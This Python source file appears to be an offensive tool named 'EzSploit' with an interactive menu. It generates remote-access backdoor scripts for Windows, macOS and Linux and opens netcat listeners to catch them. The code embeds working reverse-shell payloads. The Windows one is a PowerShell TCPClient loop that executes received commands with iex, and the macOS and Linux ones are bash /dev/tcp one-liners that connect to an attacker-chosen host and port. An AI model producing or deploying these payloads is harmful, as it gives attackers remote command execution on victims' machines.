import os
from colorama import Fore, Style

def main():
    os.system("clear")
    
    def framework():  
        logo = Fore.WHITE + '''      
           (\_/)                               
  .-""-.-.-' a\            ,--.!,       
 /  \      _.--'        __/   -*-              
 (\  /_---\\_\_        ,d08b.  '|`     
 `'-.                 0088MM            
  ,__)                '9MMP'              
  ''' + Fore.RED + Style.BRIGHT + "EzSploit " + Fore.WHITE + "v1.0" + Style.NORMAL
        
        os.system("rm temp/windows/* && rm temp/macos/* && rm temp/linux/* && rm temp/server/*")
        os.system("clear")
        print(logo)  
        
        while True:  
            def dashboard():
                print("")
                cinput = input(Fore.GREEN + Style.BRIGHT + "~$ " + Fore.WHITE + Style.NORMAL)
                if cinput == "help":
                    print(Fore.GREEN + Style.NORMAL + "usage: ")
                    print(Fore.GREEN + Style.NORMAL + "\texploit <OS>")
                    print(Fore.GREEN + Style.NORMAL + "\tlistener <OS>")
                    print(Fore.GREEN + Style.NORMAL + "\tls <path>")
                    print("")
                    print(Fore.GREEN + Style.NORMAL + "Operation System: ")
                    print(Fore.GREEN + Style.NORMAL + "\twindows")
                    print(Fore.GREEN + Style.NORMAL + "\tmac")
                    print(Fore.GREEN + Style.NORMAL + "\tlinux")
                    print("")
                    print(Fore.GREEN + Style.NORMAL + "Path: ")
                    print(Fore.GREEN + Style.NORMAL + "\tWindows")
                    print(Fore.GREEN + Style.NORMAL + "\tMacOS")
                    print(Fore.GREEN + Style.NORMAL + "\tLinux")
                    print("")
                    print(Fore.RED + Style.NORMAL + "[~]\t" + Fore.RED + Style.NORMAL + "exit")

                elif cinput == "exploit windows":
                    while True:
                        def windows():
                            print("")
                            cinput = input(Fore.RED + Style.BRIGHT + "Windows/" + Fore.GREEN + "~$ " + Fore.WHITE + Style.NORMAL)
                            if cinput == "help":
                                print(Fore.GREEN + Style.NORMAL + "usage: ")
                                print(Fore.GREEN + Style.NORMAL + "\tset lhost")
                                print(Fore.GREEN + Style.NORMAL + "\tset lport")
                                print(Fore.GREEN + Style.NORMAL + "\tset ratname")
                                print(Fore.GREEN + Style.NORMAL + "\texploit/run")
                                print(Fore.GREEN + Style.NORMAL + "\tlistener <OS>")
                                print(Fore.GREEN + Style.NORMAL + "\tls <path>")
                                print("")
                                print(Fore.GREEN + Style.NORMAL + "Path: ")
                                print(Fore.GREEN + Style.NORMAL + "\tWindows")
                                print(Fore.GREEN + Style.NORMAL + "\tMacOS")
                                print(Fore.GREEN + Style.NORMAL + "\tLinux")
                                print("")
                                print(Fore.GREEN + Style.NORMAL + "Operation System: ")
                                print(Fore.GREEN + Style.NORMAL + "\twindows")
                                print(Fore.GREEN + Style.NORMAL + "\tmac")
                                print(Fore.GREEN + Style.NORMAL + "\tlinux")
                                print("")
                                print(Fore.RED + Style.NORMAL + "[~]\t" + Fore.RED + Style.NORMAL + "exit")
                                windows()
                                
                            elif cinput == "set lhost":
                                global lhost
                                lhost = input(Fore.GREEN + Style.BRIGHT + ">\t" + Fore.WHITE + "LHOST: " + Style.NORMAL)
                                with open(f"temp/windows/lhost", "w") as file:
                                        file.write(lhost)
                                        file.close()
                                windows()

                            elif cinput == "set lport":
                                global lport
                                lport = input(Fore.GREEN + Style.BRIGHT + ">\t" + Fore.WHITE + "LPORT: " + Style.NORMAL)
                                with open(f"temp/windows/lport", "w") as file:
                                        file.write(lport)
                                        file.close()
                                windows()

                            elif cinput == "set ratname":
                                global ratname
                                ratname = input(Fore.GREEN + Style.BRIGHT + ">\t" + Fore.WHITE + "RATNAME: " + Style.NORMAL)
                                with open(f"temp/windows/ratname", "w") as file:
                                        file.write(ratname)
                                        file.close()
                                windows()

                            elif cinput == "exploit" or cinput == "run":
                                if os.path.isfile(os.path.join("temp/windows", "lhost")) and os.path.isfile(os.path.join("temp/windows", "lport")) and os.path.isfile(os.path.join("temp/windows", "ratname")):
                                    rat = "Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('" + lhost + "'," + lport + "));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
                                    os.system("rm temp/windows/*")
                                    with open(f"RAT/Windows/{ratname}.ps1", "w") as file:
                                        file.write(rat)
                                        file.close()
                                        print(Fore.YELLOW + Style.BRIGHT + ">\t" + Fore.RED + "Backdoor: " + Fore.WHITE + f"Backdoor/Windows/{ratname}.ps1" + Style.NORMAL)
                                        print(Fore.YELLOW + f">\tAllow the {lport} on your Firewall!")
                                    windows()
                                
                                else:
                                    print(Fore.YELLOW + Style.BRIGHT + '[!]\t You need to Specify the "lhost", "lport" and "ratname". ' + Fore.WHITE + Style.NORMAL)
                                    windows()
                                
                                    
                        
                            elif cinput == "back":
                                os.system("rm temp/windows/*")
                                dashboard()
                            
                            elif cinput == "exit" or cinput == "quit":
                                os.system("rm temp/windows/*")
                                os.system("clear")
                                exit()
                                
                            elif cinput == "clear" or cinput == "cls":
                                os.system("clear")
                                windows()
                                
                            elif cinput == "ls" or cinput == "dir":
                                os.system("ls RAT/")
                                windows()
                                
                            elif cinput == "ls Windows" or cinput == "dir Windows" or cinput == "ls windows":
                                os.system("ls RAT/Windows")
                                windows()
                                
                            elif cinput == "ls MacOS" or cinput == "dir MacOS" or cinput == "ls macos":
                                os.system("ls RAT/MacOS")
                                windows()
                                
                            elif cinput == "ls Linux" or cinput == "dir Linux" or cinput == "ls linux":
                                os.system("ls RAT/Linux")
                                windows()
                                
                            elif cinput == "ls Server" or cinput == "dir Server" or cinput == "ls server":
                                os.system("ls RAT/Server")
                                windows()
                            
                            elif cinput == "exploit windows":
                                print(Fore.MAGENTA + Style.BRIGHT + "[!]\t" + Fore.CYAN + "Get the DICK out of Your eyes!!! You're ALREADY Exploiting Windows!")
                                windows()
                                
                            else:
                                print(Fore.YELLOW + Style.BRIGHT + "[!]\t This command not exists. " + Fore.WHITE + Style.BRIGHT + 'Try "help".' + Style.NORMAL)
                                windows()
                                
                        windows()
                        break

                elif cinput == "exploit macos":
                    while True:
                        def mac():
                            print("")
                            cinput = input(Fore.RED + Style.BRIGHT + "MacOS/" + Fore.GREEN + "~$ " + Fore.WHITE + Style.NORMAL)
                            if cinput == "help":
                                print(Fore.GREEN + Style.NORMAL + "usage: ")
                                print(Fore.GREEN + Style.NORMAL + "\tset lhost")
                                print(Fore.GREEN + Style.NORMAL + "\tset lport")
                                print(Fore.GREEN + Style.NORMAL + "\tset ratname")
                                print(Fore.GREEN + Style.NORMAL + "\texploit/run")
                                print(Fore.GREEN + Style.NORMAL + "\tlistener <OS>")
                                print(Fore.GREEN + Style.NORMAL + "\tls <path>")
                                print("")
                                print(Fore.GREEN + Style.NORMAL + "Path: ")
                                print(Fore.GREEN + Style.NORMAL + "\tWindows")
                                print(Fore.GREEN + Style.NORMAL + "\tMacOS")
                                print(Fore.GREEN + Style.NORMAL + "\tLinux")
                                print("")
                                print(Fore.GREEN + Style.NORMAL + "Operation System: ")
                                print(Fore.GREEN + Style.NORMAL + "\twindows")
                                print(Fore.GREEN + Style.NORMAL + "\tmac")
                                print(Fore.GREEN + Style.NORMAL + "\tlinux")
                                print("")
                                print(Fore.RED + Style.NORMAL + "[~]\t" + Fore.RED + Style.NORMAL + "exit")
                                mac()
                                
                            elif cinput == "set lhost":
                                global lhost
                                lhost = input(Fore.GREEN + Style.BRIGHT + ">\t" + Fore.WHITE + "LHOST: " + Style.NORMAL)
                                with open(f"temp/macos/lhost", "w") as file:
                                        file.write(lhost)
                                        file.close()
                                mac()

                            elif cinput == "set lport":
                                global lport
                                lport = input(Fore.GREEN + Style.BRIGHT + ">\t" + Fore.WHITE + "LPORT: " + Style.NORMAL)
                                with open(f"temp/macos/lport", "w") as file:
                                        file.write(lport)
                                        file.close()
                                mac()

                            elif cinput == "set ratname":
                                global ratname
                                ratname = input(Fore.GREEN + Style.BRIGHT + ">\t" + Fore.WHITE + "RATNAME: " + Style.NORMAL)
                                with open("temp/macos/ratname", "w") as file:
                                        file.write(ratname)
                                        file.close()
                                mac()

                            elif cinput == "exploit" or cinput == "run":
                                if os.path.isfile(os.path.join("temp/macos", "lhost")) and os.path.isfile(os.path.join("temp/macos", "lport")) and os.path.isfile(os.path.join("temp/macos", "ratname")):
                                    rat = "0<&196;exec 196<>/dev/tcp/"+ lhost + "/" + lport + "; sh <&196 >&196 2>&196"
                                    os.system("rm temp/macos/*")
                                    with open(f"RAT/MacOS/{ratname}.sh", "w") as file:
                                        file.write(rat)
                                        file.close()
                                        print(Fore.YELLOW + Style.BRIGHT + ">\t" + Fore.RED + "Backdoor: " + Fore.WHITE + f"Backdoor/MacOS/{ratname}.ps1" + Style.NORMAL)
                                        print(Fore.YELLOW + f">\tAllow the {lport} on your Firewall!")
                                    mac()
                                
                                else:
                                    print(Fore.YELLOW + Style.BRIGHT + '[!]\t You need to Specify the "lhost", "lport" and "ratname". ' + Fore.WHITE + Style.NORMAL)
                                    mac()
                            
                            elif cinput == "back":
                                os.system("rm temp/macos/*")
                                dashboard()
                                
                            elif cinput == "exit" or cinput == "quit":
                                os.system("rm temp/macos/*")
                                os.system("clear")
                                exit()
                                
                            elif cinput == "clear" or cinput == "cls":
                                os.system("clear")
                                mac()
                                
                            elif cinput == "ls" or cinput == "dir":
                                os.system("ls RAT/")
                                mac()
                                
                            elif cinput == "ls Windows" or cinput == "dir Windows" or cinput == "ls windows":
                                os.system("ls RAT/Windows")
                                mac()
                                
                            elif cinput == "ls MacOS" or cinput == "dir MacOS" or cinput == "ls macos":
                                os.system("ls RAT/MacOS")
                                mac()
                                
                            elif cinput == "ls Linux" or cinput == "dir Linux" or cinput == "ls linux":
                                os.system("ls RAT/Linux")
                                mac()
                                
                            elif cinput == "ls Server" or cinput == "dir Server" or cinput == "ls server":
                                os.system("ls RAT/Server")
                                mac()
                            
                            elif cinput == "exploit macos":
                                print(Fore.MAGENTA + Style.BRIGHT + "[!]\t" + Fore.CYAN + "Get the DICK out of Your eyes!!! You're ALREADY Exploiting MacOS!")
                                mac()
                                
                            else:
                                print(Fore.YELLOW + Style.BRIGHT + "[!]\t This command not exists. " + Fore.WHITE + Style.BRIGHT + 'Try "help".' + Style.NORMAL)
                                mac()
                            
                        mac()
                        break

                elif cinput == "exploit linux":
                    while True:
                        def linux():
                            print("")
                            cinput = input(Fore.RED + Style.BRIGHT + "Linux/" + Fore.GREEN + "~$ " + Fore.WHITE + Style.NORMAL)
                            print("")
                            if cinput == "help":
                                print(Fore.GREEN + Style.NORMAL + "usage: ")
                                print(Fore.GREEN + Style.NORMAL + "\tset lhost")
                                print(Fore.GREEN + Style.NORMAL + "\tset lport")
                                print(Fore.GREEN + Style.NORMAL + "\tset ratname")
                                print(Fore.GREEN + Style.NORMAL + "\texploit/run")
                                print(Fore.GREEN + Style.NORMAL + "\tlistener <OS>")
                                print(Fore.GREEN + Style.NORMAL + "\tls <path>")
                                print("")
                                print(Fore.GREEN + Style.NORMAL + "Path: ")
                                print(Fore.GREEN + Style.NORMAL + "\tWindows")
                                print(Fore.GREEN + Style.NORMAL + "\tMacOS")
                                print(Fore.GREEN + Style.NORMAL + "\tLinux")
                                print("")
                                print(Fore.GREEN + Style.NORMAL + "Operation System: ")
                                print(Fore.GREEN + Style.NORMAL + "\twindows")
                                print(Fore.GREEN + Style.NORMAL + "\tmac")
                                print(Fore.GREEN + Style.NORMAL + "\tlinux")
                                print("")
                                print(Fore.RED + Style.NORMAL + "[~]\t" + Fore.RED + Style.NORMAL + "exit")
                                linux()
                                
                            elif cinput == "set lhost":
                                global lhost
                                lhost = input(Fore.GREEN + Style.BRIGHT + ">\t" + Fore.WHITE + "LHOST: " + Style.NORMAL)
                                with open(f"temp/linux/lhost", "w") as file:
                                        file.write(lhost)
                                        file.close()
                                linux()

                            elif cinput == "set lport":
                                global lport
                                lport = input(Fore.GREEN + Style.BRIGHT + ">\t" + Fore.WHITE + "LPORT: " + Style.NORMAL)
                                with open(f"temp/linux/lport", "w") as file:
                                        file.write(lport)
                                        file.close()
                                linux()

                            elif cinput == "set ratname":
                                global ratname
                                ratname = input(Fore.GREEN + Style.BRIGHT + ">\t" + Fore.WHITE + "RATNAME: " + Style.NORMAL)
                                with open("temp/linux/ratname", "w") as file:
                                        file.write(ratname)
                                        file.close()
                                linux()

                            elif cinput == "exploit" or cinput == "run":
                                if os.path.isfile(os.path.join("temp/linux", "lhost")) and os.path.isfile(os.path.join("temp/linux", "lport")) and os.path.isfile(os.path.join("temp/linux", "ratname")):
                                    rat = f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
                                    os.system("rm temp/linux/*")
                                    with open(f"RAT/Linux/{ratname}.sh", "w") as file:
                                        file.write(rat)
                                        file.close()
                                        print(Fore.YELLOW + Style.BRIGHT + ">\t" + Fore.RED + "Backdoor: " + Fore.WHITE + f"Backdoor/Linux/{ratname}.sh" + Style.NORMAL)
                                        print(Fore.YELLOW + f">\tAllow the {lport} on your Firewall!")
                                    linux()
                                        
                                else:
                                    print(Fore.YELLOW + Style.BRIGHT + '[!]\t You need to Specify the "lhost", "lport" and "ratname". ' + Fore.WHITE + Style.NORMAL)
                                    linux()

                            elif cinput == "back":
                                os.system("rm temp/linux/*")
                                dashboard()
                                
                            elif cinput == "exit" or cinput == "quit":
                                os.system("clear")
                                exit()
                                
                            elif cinput == "clear" or cinput == "cls":
                                os.system("clear")
                                linux()
                                
                            elif cinput == "ls" or cinput == "dir":
                                os.system("ls RAT/")
                                linux()
                                
                            elif cinput == "ls Windows" or cinput == "dir Windows" or cinput == "ls windows":
                                os.system("ls RAT/Windows")
                                linux()
                                
                            elif cinput == "ls MacOS" or cinput == "dir MacOS" or cinput == "ls macos":
                                os.system("ls RAT/MacOS")
                                linux()
                                
                            elif cinput == "ls Linux" or cinput == "dir Linux" or cinput == "ls linux":
                                os.system("ls RAT/Linux")
                                linux()
                                
                            elif cinput == "ls Server" or cinput == "dir Server" or cinput == "ls server":
                                os.system("ls RAT/Server")
                                linux()
                            
                            elif cinput == "exploit linux":
                                print(Fore.MAGENTA + Style.BRIGHT + "[!]\t" + Fore.CYAN + "Get the DICK out of Your eyes!!! You're ALREADY Exploiting Linux!")
                                linux()
                                
                            else:
                                print(Fore.YELLOW + Style.BRIGHT + "[!]\t This command not exists. " + Fore.WHITE + Style.BRIGHT + 'Try "help".' + Style.NORMAL)
                                linux()
                        
                        linux()
                        break

                elif cinput == "listener windows":
                    while True:
                        def listener_windows():
                            print("")
                            cinput = input(Fore.BLUE + Style.BRIGHT + "Listener/Windows/" + Fore.GREEN + "~$ " + Fore.WHITE + Style.NORMAL)
                            if cinput == "help":
                                print(Fore.GREEN + Style.NORMAL + "usage: ")
                                print(Fore.GREEN + Style.NORMAL + "\tset lport")
                                print(Fore.GREEN + Style.NORMAL + "\tlisten or run")
                                print(Fore.GREEN + Style.NORMAL + "\tls <path>")
                                print("")
                                print(Fore.GREEN + Style.NORMAL + "Path: ")
                                print(Fore.GREEN + Style.NORMAL + "\tWindows")
                                print(Fore.GREEN + Style.NORMAL + "\tMacOS")
                                print(Fore.GREEN + Style.NORMAL + "\tLinux")
                                print("")
                                print(Fore.RED + Style.NORMAL + "[~]\t" + Fore.RED + Style.NORMAL + "exit")
                                listener_windows()

                            elif cinput == "set lport":
                                global lport
                                lport = input(Fore.GREEN + Style.BRIGHT + ">\t" + Fore.WHITE + "LPORT: " + Style.NORMAL)
                                with open(f"temp/listener/windows/lport", "w") as file:
                                        file.write(lport)
                                        file.close()
                                        listener_windows()
                                
                            elif cinput == "listen" or cinput == "run":
                                os.system("rm temp/listener/windows/*")
                                os.system(f"nc -lnvp {lport}")
                                listener_windows()
                        
                            elif cinput == "back":
                                os.system("rm temp/listener/windows/*")
                                dashboard()
                            
                            elif cinput == "clear" or cinput == "cls":
                                os.system("clear")
                                listener_windows()
                                            
                            elif cinput == "ls" or cinput == "dir":
                                os.system("ls RAT/")
                                listener_windows()
                                
                            elif cinput == "ls Windows" or cinput == "dir Windows" or cinput == "ls windows":
                                os.system("ls RAT/Windows")
                                listener_windows()
                                
                            elif cinput == "ls MacOS" or cinput == "dir MacOS" or cinput == "ls macos":
                                os.system("ls RAT/MacOS")
                                listener_windows()
                                
                            elif cinput == "ls Linux" or cinput == "dir Linux" or cinput == "ls linux":
                                os.system("ls RAT/Linux")
                                listener_windows()
                                
                            elif cinput == "ls Server" or cinput == "dir Server" or cinput == "ls server":
                                os.system("ls RAT/Server")
                                listener_windows()
                                
                            elif cinput == "exit" or cinput == "quit":
                                os.system("clear")
                                exit()
                            
                            elif cinput == "listener windows":
                                print(Fore.MAGENTA + Style.BRIGHT + "[!]\t" + Fore.CYAN + "Get the DICK out of Your eyes!!! You're ALREADY Listenning Windows Connections!")
                                listener_windows()
                            
                            else:
                                print(Fore.YELLOW + Style.BRIGHT + "[!]\t This command not exists. " + Fore.WHITE + Style.BRIGHT + 'Try "help".' + Style.NORMAL)
                                listener_windows()

                        listener_windows()
                        break
                    
                elif cinput == "listener macos":
                    while True:
                        def listener_macos():
                            print("")
                            cinput = input(Fore.BLUE + Style.BRIGHT + "Listener/MacOS/" + Fore.GREEN + "~$ " + Fore.WHITE + Style.NORMAL)
                            if cinput == "help":
                                print(Fore.GREEN + Style.NORMAL + "usage: ")
                                print(Fore.GREEN + Style.NORMAL + "\tset lport")
                                print(Fore.GREEN + Style.NORMAL + "\tlisten or run")
                                print(Fore.GREEN + Style.NORMAL + "\tls <path>")
                                print("")
                                print(Fore.GREEN + Style.NORMAL + "Path: ")
                                print(Fore.GREEN + Style.NORMAL + "\tWindows")
                                print(Fore.GREEN + Style.NORMAL + "\tMacOS")
                                print(Fore.GREEN + Style.NORMAL + "\tLinux")
                                print("")
                                print(Fore.RED + Style.NORMAL + "[~]\t" + Fore.RED + Style.NORMAL + "exit")
                                listener_macos()

                            elif cinput == "set lport":
                                global lport
                                lport = input(Fore.GREEN + Style.BRIGHT + ">\t" + Fore.WHITE + "LPORT: " + Style.NORMAL)
                                with open(f"temp/listener/macos/lport", "w") as file:
                                        file.write(lport)
                                        file.close()
                                        listener_macos()
                                
                            elif cinput == "listen" or cinput == "run":
                                os.system("rm temp/listener/macos/*")
                                os.system(f"nc -lnvp {lport}")
                                listener_macos()
                        
                            elif cinput == "back":
                                os.system("rm temp/listener/macos/*")
                                dashboard()
                            
                            elif cinput == "clear" or cinput == "cls":
                                os.system("clear")
                                listener_macos()
                                            
                            elif cinput == "ls" or cinput == "dir":
                                os.system("ls RAT/")
                                listener_macos()
                                
                            elif cinput == "ls Windows" or cinput == "dir Windows" or cinput == "ls windows":
                                os.system("ls RAT/Windows")
                                listener_macos()
                                
                            elif cinput == "ls MacOS" or cinput == "dir MacOS" or cinput == "ls macos":
                                os.system("ls RAT/MacOS")
                                listener_macos()
                                
                            elif cinput == "ls Linux" or cinput == "dir Linux" or cinput == "ls linux":
                                os.system("ls RAT/Linux")
                                listener_macos()
                                
                            elif cinput == "ls Server" or cinput == "dir Server" or cinput == "ls server":
                                os.system("ls RAT/Server")
                                listener_macos()
                                
                            elif cinput == "exit" or cinput == "quit":
                                os.system("clear")
                                exit()
                            
                            elif cinput == "listener macos":
                                print(Fore.MAGENTA + Style.BRIGHT + "[!]\t" + Fore.CYAN + "Get the DICK out of Your eyes!!! You're ALREADY Listenning MacOS Connections!")
                                listener_macos()
                            
                            else:
                                print(Fore.YELLOW + Style.BRIGHT + "[!]\t This command not exists. " + Fore.WHITE + Style.BRIGHT + 'Try "help".' + Style.NORMAL)
                                listener_macos()

                        listener_macos()
                        break    
                    
                elif cinput == "listener linux":
                    while True:
                        def listener_linux():
                            print("")
                            cinput = input(Fore.BLUE + Style.BRIGHT + "Listener/Linux/" + Fore.GREEN + "~$ " + Fore.WHITE + Style.NORMAL)
                            if cinput == "help":
                                print(Fore.GREEN + Style.NORMAL + "usage: ")
                                print(Fore.GREEN + Style.NORMAL + "\tset lport")
                                print(Fore.GREEN + Style.NORMAL + "\tlisten or run")
                                print(Fore.GREEN + Style.NORMAL + "\tls <path>")
                                print("")
                                print(Fore.GREEN + Style.NORMAL + "Path: ")
                                print(Fore.GREEN + Style.NORMAL + "\tWindows")
                                print(Fore.GREEN + Style.NORMAL + "\tMacOS")
                                print(Fore.GREEN + Style.NORMAL + "\tLinux")
                                print("")
                                print(Fore.RED + Style.NORMAL + "[~]\t" + Fore.RED + Style.NORMAL + "exit")
                                listener_linux()

                            elif cinput == "set lport":
                                global lport
                                lport = input(Fore.GREEN + Style.BRIGHT + ">\t" + Fore.WHITE + "LPORT: " + Style.NORMAL)
                                with open(f"temp/listener/linux/lport", "w") as file:
                                        file.write(lport)
                                        file.close()
                                        listener_linux()
                                
                            elif cinput == "listen" or cinput == "run":
                                os.system("rm temp/listener/linux/*")
                                os.system(f"nc -lnvp {lport}")
                                listener_linux()
                        
                            elif cinput == "back":
                                os.system("rm temp/listener/linux/*")
                                dashboard()
                            
                            elif cinput == "clear" or cinput == "cls":
                                os.system("clear")
                                listener_linux()
                                            
                            elif cinput == "ls" or cinput == "dir":
                                os.system("ls RAT/")
                                listener_linux()
                                
                            elif cinput == "ls Windows" or cinput == "dir Windows" or cinput == "ls windows":
                                os.system("ls RAT/Windows")
                                listener_linux()
                                
                            elif cinput == "ls MacOS" or cinput == "dir MacOS" or cinput == "ls macos":
                                os.system("ls RAT/MacOS")
                                listener_linux()
                                
                            elif cinput == "ls Linux" or cinput == "dir Linux" or cinput == "ls linux":
                                os.system("ls RAT/Linux")
                                listener_linux()
                                
                            elif cinput == "ls Server" or cinput == "dir Server" or cinput == "ls server":
                                os.system("ls RAT/Server")
                                listener_linux()
                                
                            elif cinput == "exit" or cinput == "quit":
                                os.system("clear")
                                exit()
                            
                            elif cinput == "listener linux":
                                print(Fore.MAGENTA + Style.BRIGHT + "[!]\t" + Fore.CYAN + "Get the DICK out of Your eyes!!! You're ALREADY Listenning Linux Connections!")
                                listener_linux()
                            
                            else:
                                print(Fore.YELLOW + Style.BRIGHT + "[!]\t This command not exists. " + Fore.WHITE + Style.BRIGHT + 'Try "help".' + Style.NORMAL)
                                listener_linux()

                        listener_linux()
                        break    
                    
                
                elif cinput == "clear" or cinput == "cls":
                    os.system("clear")
                                
                elif cinput == "ls" or cinput == "dir":
                    os.system("ls RAT/")
                    
                elif cinput == "ls Windows" or cinput == "dir Windows" or cinput == "ls windows":
                    os.system("ls RAT/Windows")
                    
                elif cinput == "ls MacOS" or cinput == "dir MacOS" or cinput == "ls macos":
                    os.system("ls RAT/MacOS")
                    
                elif cinput == "ls Linux" or cinput == "dir Linux" or cinput == "ls linux":
                    os.system("ls RAT/Linux")
                    
                elif cinput == "ls Server" or cinput == "dir Server" or cinput == "ls server":
                    os.system("ls RAT/Server")
                    
                elif cinput == "exit" or cinput == "quit":
                    os.system("clear")
                    exit()
                    
                elif cinput == "exploit":
                    print(Fore.YELLOW + Style.BRIGHT + "[!]\t Complete the Command. " + Fore.WHITE + Style.BRIGHT + '"exploit <OS>" or use "help".' + Style.NORMAL)
                    
                elif cinput == "listener":
                    print(Fore.YELLOW + Style.BRIGHT + "[!]\t Complete the Command. " + Fore.WHITE + Style.BRIGHT + '"listener <OS>" or use "help".' + Style.NORMAL)
                
                else:
                    print(Fore.YELLOW + Style.BRIGHT + "[!]\t This command not exists. " + Fore.WHITE + Style.BRIGHT + 'Try "help".' + Style.NORMAL)
                    dashboard()
                
            
            try:          
                dashboard()
            except KeyboardInterrupt:
                os.system("rm temp/windows/* && rm temp/macos/* && rm temp/linux/* && rm temp/server/*")
                os.system("clear")
                exit()
            dashboard()
    framework()

if __name__ == "__main__":
    main()
